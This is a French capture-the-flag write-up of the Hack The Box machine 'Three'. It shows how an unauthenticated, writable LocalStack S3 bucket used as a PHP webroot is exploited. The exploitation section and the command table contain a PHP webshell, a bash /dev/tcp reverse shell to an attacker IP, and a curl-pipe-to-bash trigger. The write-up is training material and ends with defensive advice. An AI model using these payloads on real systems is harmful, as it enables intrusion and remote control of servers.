# HTB — Three (Starting Point)

**Difficulté :** Very Easy
**OS :** Linux
**Catégorie :** Starting Point
**Cible :** 10.129.41.130

## Résumé

Three illustre une mauvaise configuration **cloud / S3** : le site web de l'entreprise stocke ses fichiers dans un bucket S3 (émulé par **LocalStack**) accessible sans authentification en écriture. En uploadant un webshell PHP directement dans ce bucket — qui sert de webroot au site Apache — on obtient l'exécution de commandes à distance, puis un reverse shell complet.

## 1. Reconnaissance / Scan de ports

```bash
sudo nmap -sV 10.129.41.130
```

Résultat :

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux
```

Deux ports ouverts : **22 (SSH)** et **80 (HTTP/Apache)**. On commence par explorer le site web.

## 2. Découverte du vhost via le code source

Le site (template "The Toppers", groupe de musique) contient une page de contact dont le code source révèle une adresse email :

```
Email: mail@thetoppers.htb
```

Ce domaine `.htb` doit être résolu manuellement, le serveur utilisant le **Name-Based Virtual Hosting** (le routage se fait sur l'en-tête `Host` de la requête HTTP) :

```bash
echo "10.129.41.130   thetoppers.htb" | sudo tee -a /etc/hosts
```

## 3. Énumération de sous-domaines

Comme un serveur peut héberger plusieurs sous-domaines invisibles depuis le site principal, on bruteforce avec `gobuster` en mode `vhost` :

```bash
gobuster vhost -w subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain
```

Résultat :

```
Found: s3.thetoppers.htb (Status: 404) [Size: 21]
```

On ajoute cette entrée à `/etc/hosts` :

```bash
echo "10.129.41.130   s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

En visitant `http://s3.thetoppers.htb`, la réponse est un simple JSON :

```json
{"status": "running"}
```

Cette signature est caractéristique d'un endpoint **S3 compatible Amazon**, ici émulé par **LocalStack** — un service permettant de simuler localement l'infrastructure cloud AWS (S3, Lambda, etc.), souvent utilisé en développement/test, mais parfois laissé exposé et mal sécurisé en production.

## 4. Interaction avec le bucket S3 (`awscli`)

On installe et configure `awscli` pour interagir avec ce faux endpoint S3 :

```bash
aws configure
```

Le serveur ne vérifiant pas réellement l'authentification, des valeurs arbitraires suffisent (`temp` pour chaque champ).

### Lister les buckets

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

```
2022-07-21 18:35:09 thetoppers.htb
```

Un bucket nommé `thetoppers.htb` existe.

### Lister son contenu

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

```
PRE images/
2022-07-21 18:35:09     0 .htaccess
2022-07-21 18:35:10 11952 index.php
```

Le bucket contient exactement les fichiers servis par le site Apache (`index.php`, `.htaccess`, `images/`) : **ce bucket S3 est directement utilisé comme webroot** par le serveur web.

## 5. Exploitation — upload d'un webshell PHP

Puisque le bucket est accessible en écriture et sert de webroot, on peut y déposer un fichier PHP arbitraire qui sera exécuté par le serveur.

### Création du webshell

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Ce one-liner utilise la fonction PHP `system()` pour exécuter le contenu du paramètre GET `cmd` comme commande système.

### Upload dans le bucket

```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

### Vérification de l'exécution de code

```
http://thetoppers.htb/shell.php?cmd=id
```

Réponse :

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

L'exécution de commandes à distance (RCE) est confirmée.

## 6. Obtention d'un reverse shell

L'exécution commande par commande via l'URL étant limitée, on bascule vers un shell interactif complet.

### Récupération de l'IP VPN (interface tun)

```bash
ifconfig
```

→ IP attaquant : `10.10.15.241` (interface `utun6`)

### Script de reverse shell

```bash
cat > shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.241/1337 0>&1
EOF
```

### Listener en écoute

```bash
nc -nlv 1337
```

### Serveur HTTP local pour délivrer le script

```bash
python3 -m http.server 8000
```

### Déclenchement via le webshell

```
http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.241:8000/shell.sh|bash
```

Le serveur cible télécharge le script et l'exécute, initiant une connexion sortante vers notre listener (contournant ainsi un éventuel pare-feu bloquant les connexions entrantes) :

```
www-data@three:/var/www/html$
```

Shell interactif obtenu en tant que `www-data`.

## 7. Récupération du flag

```bash
cat /var/www/flag.txt
```

## Conclusion

Cette machine met en évidence les risques d'une **infrastructure cloud mal configurée** :

- Un bucket S3 accessible en écriture sans authentification permet à n'importe qui de modifier le contenu d'un site web.
- Lorsque ce bucket sert directement de webroot à une application capable d'exécuter du code côté serveur (PHP), l'impact passe d'une simple fuite de données à une **exécution de code arbitraire**.

**Recommandations défensives :**
- Appliquer le principe du moindre privilège sur les buckets S3 (politiques IAM strictes, pas d'écriture publique).
- Ne jamais servir directement du contenu exécutable (PHP, scripts) depuis un bucket de stockage accessible publiquement en écriture.
- Auditer régulièrement les permissions des buckets (de nombreux outils comme `s3scanner` ou AWS Config permettent de détecter les buckets mal configurés).
- Séparer le stockage statique (images, assets) du code applicatif exécutable.

## Résumé des commandes

| Étape | Commande |
|---|---|
| Scan de ports/versions | `sudo nmap -sV <IP>` |
| Résolution du vhost principal | `echo "<IP> thetoppers.htb" \| sudo tee -a /etc/hosts` |
| Bruteforce de sous-domaines | `gobuster vhost -w <wordlist> -u http://thetoppers.htb --append-domain` |
| Résolution du sous-domaine S3 | `echo "<IP> s3.thetoppers.htb" \| sudo tee -a /etc/hosts` |
| Configurer awscli | `aws configure` |
| Lister les buckets | `aws --endpoint=http://s3.thetoppers.htb s3 ls` |
| Lister le contenu d'un bucket | `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb` |
| Uploader le webshell | `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb` |
| Tester le RCE | `http://thetoppers.htb/shell.php?cmd=id` |
| Lancer le listener | `nc -nlv 1337` |
| Servir le script de reverse shell | `python3 -m http.server 8000` |
| Déclencher le reverse shell | `http://thetoppers.htb/shell.php?cmd=curl <IP>:8000/shell.sh\|bash` |
| Récupérer le flag | `cat /var/www/flag.txt` |
